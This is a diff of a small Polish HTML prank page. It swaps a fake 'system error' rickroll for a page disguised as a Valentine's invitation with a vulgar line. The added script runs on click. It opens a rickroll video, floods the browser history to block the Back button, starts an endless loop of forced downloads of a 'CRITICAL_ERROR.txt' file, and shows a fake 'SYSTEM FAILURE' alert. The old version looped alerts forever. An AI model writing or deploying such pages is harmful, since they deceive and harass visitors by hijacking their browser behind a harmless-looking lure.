@@ -1,18 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Strona Ładowania...</title>
+    <title>Walentynka</title>
+    <meta charset="utf-8">
 </head>
-<body onclick="startRickroll()" style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; cursor: pointer;">
-    <h1>⚠️ BŁĄD SYSTEMU. KLIKNIJ ABY NAPRAWIĆ...</h1>
+<body onclick="boom()" style="background:red; color:white; text-align:center; font-family:sans-serif; padding-top:50%;">
+    <h1>Chcesz zostac moja walentynka?</h1>
+    <p>Kliknij tutaj jak tak a jak nie to wypierdalaj.</p>
 
     <script>
-        function startRickroll() {
+        function boom() {
+            // 1. Muzyka
             window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-            while(true) {
-                alert("RICKROLLED!");
-                alert("Twoja przeglądarka należy teraz do mnie :D");
+
+            // 2. Blokada przycisku "Wstecz"
+            for (var i = 0; i < 1000; i++) {
+                window.history.pushState({}, '', "#error_" + i);
             }
+
+            // 3. Bomba pobierania (iOS wyrzuca spam okienek)
+            setInterval(function() {
+                const a = document.createElement('a');
+                a.href = 'data:text/plain;base64,WFRESA==';
+                a.download = 'CRITICAL_ERROR.txt';
+                a.click();
+            }, 1000);
+
+            // 4. Alert, żeby nie mogli zamknąć karty od razu
+            alert("SYSTEM FAILURE! Próba naprawy...");
         }
     </script>
 </body>
